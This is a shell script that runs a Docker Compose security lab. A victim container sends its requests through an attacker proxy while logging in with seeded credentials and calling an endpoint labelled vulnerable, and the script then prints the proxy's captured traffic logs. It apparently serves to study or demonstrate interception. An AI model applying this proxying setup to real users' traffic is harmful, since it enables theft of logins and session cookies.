#!/bin/sh
set -ex

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
REPO_ROOT="$(cd "$SCRIPT_DIR/.." && pwd)"

mkdir -p "$REPO_ROOT/artifacts/release"
rm -f "$REPO_ROOT/artifacts/release/flows.jsonl" \
      "$REPO_ROOT/artifacts/release/summary.json"

docker compose up --build -d

echo "[debug] containers started"
docker compose ps

sleep 5

echo "[debug] testing proxy path"
docker compose exec victim sh -c "curl -v --max-time 10 -x http://attacker:8080 http://web:5000/login"

echo "[1] Login as seeded victim user"
docker compose exec victim sh -c "curl -v --max-time 10 -x http://attacker:8080 -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -X POST http://web:5000/login \
  -d 'username=jdoe1' \
  -d 'password=dock@123A'"

echo "[2] Baseline search"
docker compose exec victim sh -c "curl -v --max-time 10 -x http://attacker:8080 -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -X POST http://web:5000/search \
  -d 'firstName=John' \
  -d 'lastName=Doe'"

echo "[3] Trigger vulnerable update_company endpoint"
docker compose exec victim sh -c "curl -v --max-time 10 -x http://attacker:8080 -c /tmp/cookies.txt -b /tmp/cookies.txt \
  -X POST http://web:5000/update_company \
  -d 'new_company=AcmeUpdated'"

echo "[4] Check dashboard"
docker compose exec victim sh -c "curl -v --max-time 10 -x http://attacker:8080 -c /tmp/cookies.txt -b /tmp/cookies.txt \
  http://web:5000/dashboard"

echo "[5] Check company lookup"
docker compose exec victim sh -c "curl -v --max-time 10 -x http://attacker:8080 -c /tmp/cookies.txt -b /tmp/cookies.txt \
  http://web:5000/find_company_drivers/Oceanic%20Freight"

sleep 2

echo "[debug] attacker logs"
docker compose logs attacker

echo "[debug] web logs"
docker compose logs web || docker compose logs web_server || true

if [ -f "$REPO_ROOT/scripts/export_summary.py" ]; then
  python3 "$REPO_ROOT/scripts/export_summary.py"
fi

echo "Artifacts written to $REPO_ROOT/artifacts/release"
ls -l "$REPO_ROOT/artifacts/release"

if [ -f "$REPO_ROOT/artifacts/release/flows.jsonl" ]; then
  echo "[debug] flows.jsonl"
  cat "$REPO_ROOT/artifacts/release/flows.jsonl"
fi